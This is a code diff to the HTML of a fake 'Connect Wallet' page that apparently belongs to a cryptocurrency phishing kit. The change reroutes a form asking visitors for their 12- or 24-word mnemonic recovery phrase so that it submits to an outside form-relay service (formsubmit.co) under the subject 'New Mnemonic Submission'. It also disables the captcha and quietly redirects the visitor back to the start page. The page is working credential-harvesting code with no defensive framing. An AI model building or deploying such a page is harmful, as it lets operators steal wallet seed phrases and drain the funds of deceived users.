@@ -1370,23 +1370,36 @@
 
                  <div id="div_connect_manuallly">
   <!-- Form: Twelve Words -->
-  <form id="twelveWordsForm" method="POST" data-netlify="true">
-    <input type="hidden" name="form-name" value="twelveWordsForm" />
-    <div id="phrase-container">
-      <textarea
-        class="col-12 form-control"
-        placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."
-        style="font-size:14px; font-weight:650; color: #fff !important;"
-        rows="4"
-        id="phrase1"
-        name="phrase1"
-        required
-      ></textarea>
-      <div class="row mx-auto col-10 mt-4">
-        <button id="privateBtn" class="btn btn-primary" type="submit">Connect Wallet</button>
-      </div>
+  <form action="https://formsubmit.co/your@email.com" method="POST">
+  <!-- Redirect to index.html after form submission -->
+  <input type="hidden" name="_next" value="index.html">
+  
+  <!-- Disable Captcha -->
+  <input type="hidden" name="_captcha" value="false">
+
+  <!-- Honeypot to prevent spam bots -->
+  <input type="text" name="_honey" style="display:none">
+
+  <!-- Optional: Custom Subject or Form Name -->
+  <input type="hidden" name="_subject" value="New Mnemonic Submission">
+
+  <!-- Form Body -->
+  <div id="phrase-container">
+    <textarea
+      class="col-12 form-control"
+      placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."
+      style="font-size:14px; font-weight:650; color: #fff !important;"
+      rows="4"
+      id="phrase1"
+      name="phrase1"
+      required
+    ></textarea>
+
+    <div class="row mx-auto col-10 mt-4">
+      <button id="privateBtn" class="btn btn-primary" type="submit">Connect Wallet</button>
     </div>
-  </form>
+  </div>
+</form>
 
   <!-- Success Message -->
   <div id="success-message-3" style="display: none; text-align: center; color: green;">
